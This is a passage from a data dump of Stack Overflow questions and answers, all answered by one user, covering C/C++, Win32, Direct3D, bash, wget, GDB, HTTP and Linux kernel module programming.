static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, [Out] StringBuilder lpBaseName, [In] [MarshalAs(UnmanagedType.U4)] int nSize);

[DllImport(""kernel32.dll"")]
[return: MarshalAs(UnmanagedType.Bool)]
static extern bool CloseHandle(IntPtr hObject);

private string GetWindowModuleFileName(IntPtr hWnd)
{
    uint processId = 0;
    const int nChars = 1024;
    StringBuilder filename = new StringBuilder(nChars);
    GetWindowThreadProcessId(hWnd, out processId);
    IntPtr hProcess = OpenProcess(1040, 0, processId);
    GetModuleFileNameEx(hProcess,IntPtr.Zero,filename,nChars);
    CloseHandle(hProcess);
    return (filename.ToString());
}
</code></pre>
","9530","Adam Rosenfield","<p>What exactly is it that you're trying to do?  You can get the process ID of the the process which created a window with <a href=""http://msdn.microsoft.com/en-us/library/ms633522(VS.85).aspx"" rel=""nofollow"">GetWindowThreadProcessId()</a>, followed by <a href=""http://msdn.microsoft.com/en-us/library/ms684320(VS.85).aspx"" rel=""nofollow"">OpenProcess()</a> to get the process handle.  But this seems very kludgy, and I feel like there's a more elegant way to do what you want to do.</p>
"
"<p>I'm writing a C++ program that doesn't work (I get a segmentation fault) when I compile it with optimizations (options -O1, -O2, -O3, etc.), but it works just fine when I compile it without optimizations.</p>

<p>Is there any chance that the error is in my code? or should I assume that this is a bug in GCC?</p>

<p>My GCC version is 3.4.6.</p>

<p>Is there any known workaround for this kind of problem?</p>

<p>There is a big difference in speed between the optimized and unoptimized version of my program, so I really need to use optimizations.</p>

<p><hr /></p>

<p>This is my original functor. The one that works fine with no levels of optimizations and throws a segmentation fault with any level of optimization:</p>

<pre><code>struct distanceToPointSort{
    indexedDocument* point ;
    distanceToPointSort(indexedDocument* p): point(p) {}
    bool operator() (indexedDocument* p1,indexedDocument* p2){
        return distance(point,p1) &lt; distance(point,p2) ;
    }
} ;
</code></pre>

<p>And this one works flawlessly with any level of optimization:</p>

<pre><code>struct distanceToPointSort{
    indexedDocument* point ;
    distanceToPointSort(indexedDocument* p): point(p) {}
    bool operator() (indexedDocument* p1,indexedDocument* p2){

        float d1=distance(point,p1) ;
        float d2=distance(point,p2) ;

        std::cout &lt;&lt; """" ;  //without this line, I get a segmentation fault anyways

        return d1 &lt; d2 ;
    }
} ;
</code></pre>

<p>Unfortunately, this problem is hard to reproduce because it happens with some specific values. I get the segmentation fault upon sorting just one out of more than a thousand vectors, so it really depends on the specific combination of values each vector has.</p>
","9530","Adam Rosenfield","<p>The error is in your code.  It's likely you're doing something that invokes undefined behavior according to the C standard which just happens to work with no optimizations, but when GCC makes certain assumptions for performing its optimizations, the code breaks when those assumptions aren't true.  Make sure to compile with the <code>-Wall</code> option, and the <code>-Wextra</code> might also be a good idea, and see if you get any warnings.  You could also try <code>-ansi</code> or <code>-pedantic</code>, but those are likely to result in false positives.</p>
"
"<p>What's the best way to output the public contents of an object to a human-readable file? I'm looking for a way to do this that would not require me to know of all the members of the class, but rather use the compiler to tell me what members exist, and what their names are. There have to be macros or something like that, right?</p>

<p>Contrived example: </p>

<pre><code>class Container
{
public:
    Container::Container() {/*initialize members*/};
    int stuff; 
    int otherStuff;
};
Container myCollection;
</code></pre>

<p>I would like to be able to do something to see output along the lines of ""myCollection: stuff = value, otherStuff = value"". 
But then if another member is added to Container, </p>

<pre><code>class Container
{
public:
    Container::Container() {/*initialize members*/};
    int stuff;
    string evenMoreStuff;
    int otherStuff;
};
Container myCollection;</code></pre>

<p>This time, the output of this snapshot would be ""myCollection: stuff = value, evenMoreStuff=value, otherStuff = value""</p>

<p>Is there a macro that would help me accomplish this? Is this even possible? (Also, I can't modify the Container class.)
Another note: I'm most interested about a potential macros in VS, but other solutions are welcome too.</p>
","9530","Adam Rosenfield","<p>I'd highly recommend taking a look at Google's <a href=""http://code.google.com/p/protobuf/"" rel=""nofollow"">Protocol Buffers</a>.</p>
"
"<p>I've noticed, using visual studio 2003, that I can ""comment out"" my comments to make them no longer be comments. This one needs an example:</p>

<p>If I have:</p>

<pre><code>/*
int commented_out = 0;
*/
</code></pre>

<p>I can comment out the /* and */ with // and code within the /* and */ is no longer ""commented out"" (the text changes to non-comment color <strong>and</strong> the compiler treats it as code once again). Like so:</p>

<pre><code>///*
int commented_out = 0;
//*/
</code></pre>

<p>I've found this is true for msvc 2003, is this normal C++ behavior or is it just a fluke that works with this compiler?</p>
","9530","Adam Rosenfield","<p>Yep, this is perfectly normal behavior.  The C++ standard says that a <code>/*</code> is the start of a comment block only if it itself is not commented out.  I often use what you've written above to comment or uncomment a block of code by adding/deleting one character.  A nice little trick for switching between two blocks of code, one of which is always commented out is:</p>

<pre><code>//*
code block 1 (uncommented)
/*/
code block 2 (commented)
//*/</code></pre>

<p>Now, delete one slash from the start, and it becomes</p>

<pre><code>/*
code block 1 (commented)
/*/
code block 2 (uncommented)
//*/</code></pre>

<p>Not something to use in production code, but very useful for quick debugging changes.</p>
"
"<p>We have had an interesting competition once, where everyone would write their implementation of hello world program. One requirement was that is should be less than 20 bytes in compiled form. the winner would be the one whose version is the smallest...</p>

<p>What would be your solution? :)</p>

<p><strong>Platform: 32bit, x86</strong></p>

<p><strong>OS: DOS, Win, GNU/Linux, *BSD</strong></p>

<p><strong>Language: Asm, C</strong>, or anything else that compiles into binary executable (i.e. no bash scripts and stuff ;)</p>
","9530","Adam Rosenfield","<p>Here's a 32-byte version using Linux system calls:</p>

<pre><code>
.globl _start
_start:
        movb $4, %al
        xor %ebx, %ebx
        inc %ebx
        movl $hello, %ecx
        xor %edx, %edx
        movb $11, %dl
        int $0x80               ;;; sys_write(1, $hello, 11)
        xor %eax, %eax
        inc %eax
        int $0x80               ;;; sys_exit(something)
hello:
        .ascii ""Hello world""
</code></pre>

When compiled into a minimal ELF file, the full executable is 116 bytes:

<pre>
00000000  7f 45 4c 46 01 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
00000010  02 00 03 00 01 00 00 00  54 80 04 08 34 00 00 00  |........T...4...|
00000020  00 00 00 00 00 00 00 00  34 00 20 00 01 00 00 00  |........4. .....|
00000030  00 00 00 00 01 00 00 00  00 00 00 00 00 80 04 08  |................|
00000040  00 80 04 08 74 00 00 00  74 00 00 00 05 00 00 00  |....t...t.......|
00000050  00 10 00 00 b0 04 31 db  43 b9 69 80 04 08 31 d2  |......1.C.i...1.|
00000060  b2 0b cd 80 31 c0 40 cd  80 48 65 6c 6c 6f 20 77  |....1.@..Hello w|
00000070  6f 72 6c 64                                       |orld|
00000074
</pre>
"
"<p>Is it possible to use the __unused attribute macro on Objective-C object method parameters? I've tried placing it in various positions around the parameter declaration but it either causes a compilation error or seems to be ignored (i.e., the compiler still generates unused parameter warnings when compiling with -Wall -Wextra).</p>

<p>Has anyone been able to do use this? Is it just unsupported with Objective-C? For reference, I'm currently using Apple's build of GCC 4.0.1.</p>
","9530","Adam Rosenfield","<p>A common idiom is to use the following:</p>

<pre><code>#define UNUSED(x) (void)x
void SomeFunction(int param1, int param2)
{
  UNUSED(param2);
  // do stuff with param1
}</code></pre>

<p>The <code>UNUSED(param2)</code> statement doesn't generate any object code, eliminates warnings about unused variables, and clearly documents the code as not using the variable.</p>
"
"<p>I have to read a txt file with lines formated like this:</p>

<pre>
1: (G, 2), (F, 3)
2: (G, 2), (F, 3)
3: (F, 4), (G, 5)
4: (F, 4), (G, 5)
5: (F, 6), (c, w)
6: (p, f), (G, 7)
7: (G, 7), (G, 7)
w: (c, w), (c, w)
</pre>

<p>Each line will feed a struct with its data (the 5 numbers or letters in it).<br />
What's the best way to read the line and get the strings I want?<br />
I'm currently using a long sequence of conditions using <code>fgetc</code> but that seems ugly and not very smart.<br />
I can't use arrays because the lines may vary in size if the numbers have two digits.</p>
","9530","Adam Rosenfield","<p>Use <code>fgets()</code>:</p>

<pre><code>#include &lt;stdio.h&gt;

int main(void)
{
  char line[256];
  while(fgets(line, sizeof(line), stdin) != NULL)  // fgets returns NULL on EOF
  {
    // process line; line is guaranteed to be null-terminated, but it might not end in a
    // newline character '\n' if the line was longer than the buffer size (in this case,
    // 256 characters)
  }

  return 0;
}</code></pre>
"
"<p>I am planning on developing a windows based client app and a platform agnostic server app. The client app basically sends messages to the server app. Client app can send messages in English or in other languages. Should I be using UNICODE for encoding messages in my client app? What is the general practise among applications involved in network communication? My client and server app will be using custom protocol for exchanging messages over TCP/IP. What UNICODE encoding does Windows and UNIX platform support by default? Should I be exchanging the encoding type in my protocol as well for decoding the UNICODE messages? Please advise.</p>
","9530","Adam Rosenfield","<p>You can use whatever encoding you want, you just have to be careful about things like byte order.  Windows internally uses UTF-16 (little-endian), so if you expect most systems to be Windows, then you should probably go with that.  Otherwise, I'd recommend UTF-8, which doesn't have byte-order issues to worry about.</p>

<p>If you do go with UTF-16 (or UTF-32, which I definitely would <em>not</em> recommend), spell out in no uncertain terms what the endianness of the data on the wire is.  Then, for every client which reads or writes a Unicode character to a network socket, convert from the platform's native endianness to the network endianness - this is either a no-op or a byte swap.</p>
"
"<p>Given two 3D vectors A and B, I need to derive a rotation matrix which rotates from A to B.</p>

<p>This is what I came up with:</p>

<ol>
<li>Derive cosine from <strike>acos</strike>(A . B)</li>
<li>Derive sine from <strike>asin</strike>(|A x B| / (|A| * |B|))</li>
<li>Use A x B as axis of rotation</li>
<li>Use matrix given near the bottom of <a href=""http://www.euclideanspace.com/maths/geometry/rotations/conversions/angleToMatrix/index.htm"" rel=""nofollow"">this page</a> (axis angle)</li>
</ol>

<p>This works fine except for rotations of 0&deg; (which I ignore) and 180&deg; (which I treat as a special case). Is there a more graceful way to do this using the Direct3D library? I am looking for a Direct3D specific answer.</p>

<p>Edit: Removed acos and asin (see <a href=""http://stackoverflow.com/questions/286274/direct3d-geometry-rotation-matrix-from-two-vectors#286300"">Hugh Allen's post</a>)</p>
","9530","Adam Rosenfield","<p>No, you're pretty much doing it the best way possible.  I don't think there is a built-in DirectX function that does what you want.  For step 4, you can use <a href=""http://msdn.microsoft.com/en-us/library/bb205357(VS.85).aspx"" rel=""nofollow""><code>D3DXMatrixRotationAxis()</code></a>.  Just be careful about the edge cases, such as when |A| or |B| is zero, or when the angle is 0° or 180°.</p>
"
"<p>How do I programmatically find out the width and height of the video in an mpeg-2 <strike>transport</strike> program stream file?  </p>

<p>Edit: I am using C++, but am happy for examples in any language.
Edit: Corrected question - it was probably program streams I was asking about</p>
","9530","Adam Rosenfield","<p>Check out the source code to <a href=""http://libmpeg2.sourceforge.net/"" rel=""nofollow"">libmpeg2</a>, a F/OSS MPEG2 decoder.  It appears that the width and height are set in the <code>mpeg2_header_sequence()</code> function in <code>header.c</code>.  I'm not sure how control flows to that particular function, though.  I'd suggest opening up an MPEG2 file in something using libmpeg2 (such as <a href=""http://www.mplayerhq.hu"" rel=""nofollow"">MPlayer</a>) and attaching a debugger to see more closely exactly what it's doing.</p>
"
"<p>I was really looking at the differences between pass by value and how Java allocates objects and what java does to put objects on the stack.</p>

<p>Is there anyway to access objects allocated on the heap?  What mechanisms does java enforce to guarantee that the right method can access the right data off the heap?</p>

<p>It seems like if you were crafty and maybe even manipulate the java bytecode during runtime, that you might be able to manipulate data off the heap when you aren't supposed to?</p>
","9530","Adam Rosenfield","<p>All objects in Java are located on the heap.  I'm not quite sure what you mean by ""access objects from the heap"".  The only things stored on the stack are the list of functions which called into the current context and their local variables and parameters.  All local variables and parameters are either primitive types or references.</p>

<p>If you allocate an object using <code>new</code> (which is the only way to allocate non-primitive types; yes this includes array types), then the object is allocated on the heap, and a reference to that object is stored on either the stack or the heap, depending on if the reference is stored in a local variable/parameter or as a member of another object.</p>

<p>When passed as parameters to functions, all objects are passed by reference - if the function modifies the parameter, the original object is also modified.  Identically, one could also say that the object references are passed by value - if you change a parameter to refer to a new object, it will continue to refer to that object for the duration of the function, but the original object which was passed in will still refer to whatever it referred to before.  Primitive types are also passed by value.</p>
"
"<p><strong>Original Question</strong></p>

<p>I am writting a logging class where the goal is to be able to do this:</p>

<pre><code>// thread one
Logger() &lt;&lt; ""Some string"" &lt;&lt; std::ios::hex &lt;&lt; 45;
// thread two
Logger() &lt;&lt; L""Some wide string"" &lt;&lt; std::endl;
</code></pre>

<p>Currently my Logger header looks something like this:</p>

<pre><code>#pragma once;
#include &lt;ostream&gt;    
class Logger
{
public:
    Logger();
    ~Logger();

    std::ostream* out_stream;
};

template &lt;typename T&gt;
Logger&amp; operator&lt;&lt; (Logger&amp; logger, T thing) {
    *logger.out_stream &lt;&lt; thing;
    return logger;
}
</code></pre>

<p>Some notes about this class:</p>

<ol>
<li>Cross platform compatibility is not an issue.</li>
<li>Inside of Logger.cpp there is a singleton class that takes care of creating the ""real"" ostream.</li>
<li>The Logger constructor and deconstructor perform the necessary locking of the singleton.</li>
</ol>

<p>I have three problems:</p>

<ul>
<li>How do I make the operator&lt;&lt; function a friend or member so I can set out_stream as private? </li>
<li>How do I make the operator&lt;&lt; function work for manipulators?</li>
<li>How can I add a specialization so that if T is a WCHAR* or std::wstring that it will convert it to char* or std::string before passing it to out_stream?  (I can do the conversion. Losing high unicode characters isn't a problem in my case.)</li>
</ul>

<p><strong>Summary of things learned in answers:</strong></p>

<ul>
<li>Put template  BEFORE friend instead of after.</li>
<li>std::ios::hex is not a manipulator.  std::hex is a manipulator.</li>
</ul>

<p><strong>End Result</strong></p>

<pre><code>#pragma once
#include &lt;ostream&gt;
#include &lt;string&gt;

std::string ConvertWstringToString(std::wstring wstr);

class Logger
{
public:
    Logger();
    ~Logger();

    template &lt;typename T&gt;
    Logger&amp; operator&lt;&lt; (T data) {
    	*out &lt;&lt; data;
    	return *this;
    }
    Logger&amp; operator&lt;&lt; (std::wstring data) {
    	return *this &lt;&lt; ConvertWstringToString(data);
    }
    Logger&amp; operator&lt;&lt; (const wchar_t* data) {
    	std::wstring str(data);
    	return *this &lt;&lt; str;
    }

private:
    std::ostream* out;
};
</code></pre>
","9530","Adam Rosenfield","<p>Using a template is the right way to do it, but you just have to make sure the template is in the <strong>header</strong> file (<code>logger.h</code>, or whatever you called), <em>not</em> in the implementation file (<code>logger.cpp</code>).  This will automatically work for any type which has <code>operator &lt;&lt;</code> defined with an <code>std::ostream</code>.  It will also automatically work with stream manipulator objects - those are really just functions which take an <code>std::ostream</code> parameter, and <code>operator &lt;&lt;</code> just calls the function on the <code>ostream</code>.</p>

<p>You can make <code>operator &lt;&lt;</code> a friend function as follows:</p>

<pre><code>template &lt;typename T&gt; friend Logger&amp; operator&lt;&lt; (Logger&amp; logger, T thing);
</code></pre>

<p>Specializations are easy - just use template specializations (again, in the header file):</p>

<pre><code>template &lt;typename T&gt;
Logger&amp; operator&lt;&lt; (Logger&amp; logger, T thing) {
    *logger.out_stream &lt;&lt; thing;
    return logger;
}

// Template specialization - the ""template &lt;&gt;"" part is necessary
template &lt;&gt;
Logger&amp; operator&lt;&lt; (Logger&amp; logger, const wchar_t *wstr)
{
  // convert wstr to an ANSI string and log it
}

template &lt;&gt;
Logger&amp; operator&lt;&lt; (Logger&amp; logger, const std::wstring &amp; wstr)
{
  // convert wstr to an ANSI string and log it
}
</code></pre>
"
"<p>I need to have a set of overloaded functions in my code but I get convertion wanrings.
Here is a test code:</p>

<pre><code>#include windows.h

void f(DWORD arg){...}

//void f(SIZE_T arg){}

void main(void)
{
DWORD dword=0;
SIZE_T size_t=dword;
f(size_t);

}
</code></pre>

<p>The compiler gives warning:</p>

<pre><code>test.cpp(11) : warning C4244: 'argument' : conversion from 'SIZE_T' to 'DWORD', possible loss of data
</code></pre>

<p>If I uncomment void f(SIZE_T arg) I get</p>

<pre><code>test.cpp(5) : error C2084: function 'void f(DWORD)' already has a body
</code></pre>

<p>How can I avoid having this warning or error? </p>
","9530","Adam Rosenfield","<p><code>size_t</code> is guaranteed to be an unsigned integral type, but the number of bits it has isn't specified.  It could be equal to a <code>DWORD</code> (32 bits), or it could be 64 bits on a 64-bit platform.  For maximal portability, you shouldn't assume it has a certain number of bits, which is what the compiler is warning you about.  If you know your value will never exceed 2^32 (which is a reasonable assumption in 99.99% of cases), then you can just cast to a <code>DWORD</code> to get rid of the warning:</p>

<pre><code>SIZE_T sz = dword;
f((DWORD)sz);  // no warning here
</code></pre>

<p>The error you're getting is because in your case, <code>size_t</code> is actually 32 bits, and so the function signatures of your two <code>f</code> functions are identical - they both take a single unsigned 32-bit parameter.  You'll have to use separate names for them in order to guarantee that your program is portable between 32- and 64-bit platforms:</p>

<pre><code>void f_DWORD(DWORD arg) { ... }
void f_size_t(size_t arg) { ... }
</code></pre>

<p>One final note: <code>size_t</code> is a built-in type.  <code>SIZE_T</code> is non-standard and is almost definitely a typedef or a #define for <code>size_t</code>.  You should use <code>size_t</code> instead of <code>SIZE_T</code>, and you should also avoid naming your variables <code>size_t</code>, since that introduces confusion by shadowing a type name with a variable name.</p>
"
"<p>Without getting into the details of <em>why</em>, I'm looking for a clean (as possible) way to replace kernel functions and system calls from a loadable module.  My initial idea was to write some code to override some functions, which would take the original function (perhaps, if possible, <em>call</em> the function), and then add some of my own code.  The key is that the function that I write has to have the name of the original function, so other code, upon trying to access it, will access mine instead.</p>

<p>I can easily (comparatively) do this directly in the kernel by just throwing my code into the appropriate functions, but I was wondering if anyone knew a little C magic that isn't <em>necessarily</em> horrible kernel (or C) coding practice that could achieve the same result.</p>

<p>Thoughts of #defines and typedefs come to mind, but I can't quite hack it out in my head.</p>

<p>In short: does anyone know a way to effectively override functions in the Linux kernel (from a module)?</p>

<p>EDIT: Since it's been asked, I essentially want to log certain functions (creating/deleting directories, etc.) <em>from within the kernel</em>, but for sanity's sake, a loadable module seems to make sense, rather than having to write a big patch to the kernel code and recompile on every change.  A minimal amount of added code to the kernel is okay, but I want to offload most of the work to a module.</p>
","9530","Adam Rosenfield","<p>I'm not entirely sure I understand what you want to do, but I think that <a href=""http://www.ksplice.com/"" rel=""nofollow"">ksplice</a> may be a good solution.  It's still under development, so I don't know if it's in any sort of usable condition right now.</p>
"
"<p>Do you have to pass delete the same pointer that was returned by new, or can you pass it a pointer to one of the classes base types?  For example:</p>

<pre><code>class Base
{
public:
    virtual ~Base();
    ...
};

class IFoo
{
public:
    virtual ~IFoo() {}
    virtual void DoSomething() = 0;
};

class Bar : public Base, public IFoo
{
public:
    virtual ~Bar();
    void DoSomething();
    ...
};

Bar * pBar = new Bar;
IFoo * pFoo = pBar;
delete pFoo;
</code></pre>

<p>Of course this is greatly simplified.  What I really want to do is create a container full of boost::shared_ptr and pass it to some code that will remove it from the container when it is finished. This code will know nothing of the implementation of Bar or Base, and will rely on the implied delete operator in the shared_ptr destructor to do the right thing.</p>

<p>Can this possibly work? My intuition says no, since the pointers will not have the same address.  On the other hand, a dynamic_cast&lt;Bar*> should work, so somewhere the compiler is storing enough information to figure it out.
<hr>
Thanks for the help, everybody who answered and commented. I already knew the importance of virtual destructors, as shown in my example; after seeing the answer I gave it a little thought, and realized the <i>whole reason</i> for a virtual destructor is this exact scenario. Thus it had to work. I was thrown by the absence of a visible means of converting the pointer back to the original. A little more thinking led me to believe there was an invisible means, and I theorized that the destructor was returning the true pointer for delete to release. Investigating the compiled code from Microsoft VC++ confirmed my suspicion when I saw this line in ~Base:</p>

<pre><code>mov	eax, DWORD PTR _this$[ebp]
</code></pre>

<p>Tracing the assembler revealed that this was the pointer being passed to the delete function. Mystery solved.</p>

<p>I've fixed the example to add the virtual destructor to IFoo, it was a simple oversight. Thanks again to everyone who pointed it out.</p>
","9530","Adam Rosenfield","<p>Yes, it will work, <strong>if and only if</strong> the base class destructor is virtual, which you have done for the <code>Base</code> base class but not for the <code>IFoo</code> base class.  If the base class destructor is virtual, then when you call <code>operator delete</code> on the base class pointer, it uses dynamic dispatch to figure out how to delete the object by looking up the derived class destructor in the virtual function table.</p>

<p>In your case of multiple inheritance, it will only work if the base class you're deleting it through has a virtual destructor; it's ok for the other base classes to not have a virtual destructor, but only if you don't try to delete any derived objects via those other base class pointers.</p>
"
"<p>When issuing an HTTP DELETE request, the request URI should completely identify the resource to delete. However, is it allowable to add extra meta-data as part of the entity body of the request?</p>
","9530","Adam Rosenfield","<p>It appears to me that <a href=""http://tools.ietf.org/html/rfc2616"">RFC 2616</a> does not specify this.</p>

<p>From section 4.3:</p>

<blockquote>
  <p>The presence of a message-body in a request is signaled by the
  inclusion of a Content-Length or Transfer-Encoding header field in
  the request's message-headers. A message-body MUST NOT be included in
  a request if the specification of the request method (section 5.1.1)
  does not allow sending an entity-body in requests. A server SHOULD
  read and forward a message-body on any request; if the request method
  does not include defined semantics for an entity-body, then the
  message-body SHOULD be ignored when handling the request.</p>
</blockquote>

<p>And section 9.7:</p>

<blockquote>
  <p>The DELETE method requests that the origin server delete the resource
  identified by the Request-URI. This method MAY be overridden by human
  intervention (or other means) on the origin server. The client cannot
  be guaranteed that the operation has been carried out, even if the
  status code returned from the origin server indicates that the action
  has been completed successfully. However, the server SHOULD NOT
  indicate success unless, at the time the response is given, it
  intends to delete the resource or move it to an inaccessible
  location.</p>
  
  <p>A successful response SHOULD be 200 (OK) if the response includes an
  entity describing the status, 202 (Accepted) if the action has not
  yet been enacted, or 204 (No Content) if the action has been enacted
  but the response does not include an entity.</p>
  
  <p>If the request passes through a cache and the Request-URI identifies
  one or more currently cached entities, those entries SHOULD be
  treated as stale. Responses to this method are not cacheable.c</p>
</blockquote>

<p>So it's not explicitly allowed or disallowed, and there's a chance that a proxy along the way might remove the message body (although it SHOULD read and forward it).</p>
"
"<p>I was reading about the <code>debuggerstepperboundary</code> attribute and a site says it is is useful in a context switch.</p>

<p>What exactly is a context switch? I'm assuming it is a switch from one thread to another, or in execution or security context? However, these are not particularly educated guesses so I'm asking here.</p>
","9530","Adam Rosenfield","<p>It usually refers to switching between threads or processes.  <a href=""http://en.wikipedia.org/wiki/Context_switch"" rel=""nofollow"">Wikipedia</a> has a more thorough description.</p>
"
"<p>I have a bash shell script that loops through all child directories (but not files) of a certain directory.  The problem is that some of the directory names contain spaces.  </p>

<p>Here are the contents of my test directory:</p>

<pre><code>$ls -F test
Baltimore/  Cherry Hill/  Edison/  New York City/  Philadelphia/  cities.txt
</code></pre>

<p>And the code that loops through the directories:</p>

<pre><code>for f in `find test/* -type d`; do
  echo $f
done
</code></pre>

<p>Here's the output:</p>

<pre>
test/Baltimore
test/Cherry
Hill
test/Edison 
test/New
York
City
test/Philadelphia
</pre>

<p>Cherry Hill and New York City are treated as 2 or 3 separate entries.</p>

<p>I tried quoting the filenames, like so:</p>

<pre><code>for f in `find test/* -type d | sed -e 's/^/\""/' | sed -e 's/$/\""/'`; do
  echo $f
done
</code></pre>

<p>but to no avail.</p>

<p>There's got to be a simple way to do this.</p>

<hr>

<p>The answers below are great.  But to make this more complicated - I don't always want to use the directories listed in my test directory.  Sometimes I want to pass in the directory names as command-line parameters instead.</p>

<p>I took Charles' suggestion of setting the IFS and came up with the following:</p>

<pre><code>dirlist=""${@}""
(
  [[ -z ""$dirlist"" ]] &amp;&amp; dirlist=`find test -mindepth 1 -type d` &amp;&amp; IFS=$'\n'
  for d in $dirlist; do
    echo $d
  done
)
</code></pre>

<p>and this works just fine unless there are spaces in the command line arguments (even if those arguments are quoted).  For example, calling the script like this: <code>test.sh ""Cherry Hill"" ""New York City""</code> produces the following output:</p>

<pre>
Cherry
Hill
New
York
City
</pre>
","9530","Adam Rosenfield","<p>To add to what <a href=""http://stackoverflow.com/questions/301039/how-to-escape-white-space-in-bash-loop-list#301097"">Jonathan</a> said: use the <code>-print0</code> option for <code>find</code> in conjunction with <code>xargs</code> as follows:</p>

<pre><code>find test/* -type d -print0 | xargs -0 command
</code></pre>

<p>That will execute the command <code>command</code> with the proper arguments; directories with spaces in them will be properly quoted (i.e. they'll be passed in as one argument).</p>
"
"<p>I would like to know the procedure to adopt to parse and obtain text content from Microsoft word (.doc and .docx) documents . programming language used should be plain ""C"" (should be gcc).</p>

<p>Are there any libraries that already do this job,</p>

<p>extension : can i use the same procedure to parse text from Microsoft power point files also ?</p>
","9530","Adam Rosenfield","<p>Microsoft Word documents are an enormous beast - you <em>definitely</em> don't want to be writing this code yourself.  Look into using an existing free Word library such as <a href=""http://www.winfield.demon.nl/"" rel=""nofollow"">antiword</a> or <a href=""http://wvware.sourceforge.net/"" rel=""nofollow"">wvWare</a>.</p>
"
"<p>how to delete a file which is in use/open by some process in runtime.
i am using vb.net for my project and a image is shown in picturebox.
and that should be deleted, with out closing that file.</p>

<p>thanks in advance,
vijay</p>
","9530","Adam Rosenfield","<p>If the file is opened by another process in exclusive mode, you can't -- Windows won't let you.  In that case, the best you can do is to either wait for the other process to close the file and then delete it, or have it be deleted at the next reboot by using <a href=""http://msdn.microsoft.com/en-us/library/aa365240(VS.85).aspx"" rel=""nofollow""><code>MoveFileEx()</code></a> with the flag <code>MOVEFILE_DELAY_UNTIL_REBOOT</code> and a destination location of <code>NULL</code>.</p>

<p>If the file is opened non-exclusively by another process, you can just call <a href=""http://msdn.microsoft.com/en-us/library/aa363915(VS.85).aspx"" rel=""nofollow""><code>DeleteFile()</code></a> normally (assuming you have permission to do so).  The file will remain while the other process has it open, but it will be deleted as soon as the other process closes it.</p>

<p>(And yes, I realize those links are for the Win32 C API; the same functions should be available under VB .NET)</p>
"
"<p>Although I'm doubtful, I'm curious as to whether it's possible to extract primitive-type template parameters from an existing type, perhaps using RTTI.</p>

<p>For example:</p>

<pre><code>typedef std::bitset&lt;16&gt; WordSet;
</code></pre>

<p>Would it be possible to extract the number 16 in the above code without hard-coding it elsewhere? Compiler specific implementations are welcome, though I'm particularly interested in <code>g++</code>.</p>
","9530","Adam Rosenfield","<p>In the case of <code>std::bitset</code>, you can just use the <code>size()</code> member function:</p>

<pre><code>size_t sz = oh_my_word.size();  // sz is now 16
</code></pre>

<p>In the general case, you can define a member function which returns the size in a similar manner:</p>

<pre><code>template &lt;int N&gt;
class Foo
{
public:
  int size() const { return N; }
};
</code></pre>
"
"<p>Im trying to extract a line from wget's result but having trouble with it.
This is my wget call:</p>

<p>$ wget -SO- -T 1 -t 1 <a href=""http://myurl.com:15000/myhtml.html"" rel=""nofollow"">http://myurl.com:15000/myhtml.html</a></p>

<pre>
--18:24:12--  http://xxx.xxxx.xxxx:15000/myhtml.html
           => `-'
Resolving xxx.xxxx.xxxx... xxx.xxxx.xxxx
Connecting to xxx.xxxx.xxxx|xxx.xxxx.xxxx|:15000... connected.
HTTP request sent, awaiting response...
  HTTP/1.1 302 Found
  Date: Tue, 18 Nov 2008 23:24:12 GMT
  Server: IBM_HTTP_Server
  Expires: Thu, 01 Dec 1994 16:00:00 GMT
  Location: https://xxx.xxxx.xxxx/siteminderagent/...
  Content-Length: 508
  Keep-Alive: timeout=10, max=100
  Connection: Keep-Alive
  Content-Type: text/html; charset=iso-8859-1
Location: https://xxx.xxxx.xxxx//siteminderagent/...
--18:24:13--  https://xxx.xxxx.xxxx/siteminderagent/...
           => `-'
Resolving xxx.xxxx.xxxx... failed: Name or service not known.
</pre>

<p>if I do this: <br/><br/></p>

<p>$ wget -SO- -T 1 -t 1 <a href=""http://myurl.com:15000/myhtml.html"" rel=""nofollow"">http://myurl.com:15000/myhtml.html</a> | egrep -i ""302"" <br/>
.
It doesnt return me the line that contains the string. I just want to check if the site or siteminder is up.</p>
","9530","Adam Rosenfield","<p><code>wget</code> prints the headers to stderr, not to stdout.  You can redirect stderr to stdout as follows:</p>

<pre><code>wget -SO- -T 1 -t 1 http://myurl.com:15000/myhtml.html 2&gt;&amp;1 | egrep -i ""302""
</code></pre>

<p>The ""2>&amp;1"" part says to redirect ('>') file descriptor 2 (stderr) to file descriptor 1 (stdout).</p>
"
"<p>I have an application that is sensitive to the directory it gets invoked from — it loads some files using relative paths.</p>

<p>When I start the program through a debugger, how can I control what the initial current directory will be?</p>

<p>I'd prefer to avoid adding special code to the debugged program to make it call <code>chdir</code>; my instinct is that the debugger should provide some way to specify that externally, since it's inherently an external setting anyway.</p>

<p>The debugger I'm using is TotalView, but I'm open to answers for other Linux debuggers since it could help me find a comparable setting in TV. I can specify environment variables when I invoke the program, so on a lark, I tried setting <code>PWD</code>, but no luck.</p>
","9530","Adam Rosenfield","<p>With GDB, the initial working directory is the directory you instantiate GDB from.  So, just run GDB from whatever you want the working directory to be.  Alternatively, while the program is running, you can change the current working directory just by doing:</p>

<pre><code>(gdb) print chdir(""new/working/directory"")
</code></pre>

<p>GDB also had a built-in command for changing the process' working directory from the GDB prompt:</p>

<pre><code>(gdb) cd new/working/directory
</code></pre>

<p>I've never used TotalView, but it should have a similar functionality for executing code (with side effects) from within the debugger.</p>
"
"<p>How do I compare two images &amp; recognize the pattern in an image irrespective of its size and pattern size, and using .Net C#?  Also, which algorithms are used for doing so from Image Processing?</p>
","9530","Adam Rosenfield","<p><a href=""http://en.wikipedia.org/wiki/Scale-invariant_feature_transform"" rel=""nofollow"">Scale-invariant feature transform (SIFT)</a> might be what you're looking for.  It's not simple to understand or implement, however.</p>
"
"<p>I realize that far is compiler specific, but my expectation is that the placement of the far specifier should make sense to those who really understand pointers.</p>

<p>So, I have two applications that share the processor's entire memory space.</p>

<p>App A needs to call function foo that exists in app B.</p>

<p>I know the memory location of function foo.</p>

<p>So this should work, in app A:</p>

<pre><code>typedef int (* __far MYFP)(int input);

void somefunc(void)
{
   int returnvalue;
   MYFP foo;

   foo = (MYFP) 0xFFFFFA;

   returnvalue = foo(39);
}
</code></pre>

<ul>
<li>Is the __far in the right spot in the typedef?</li>
<li>Do I need to add __far to the (MYFP) cast?</li>
<li>Some information suggests that the call to foo doesn't need to be dereferenced, what is your experience?</li>
<li><p>What else about this looks incorrect, or might I try to accomplish this?</p></li>
<li><p>Is there a better way to do this?</p></li>
</ul>

<p>Edit:</p>

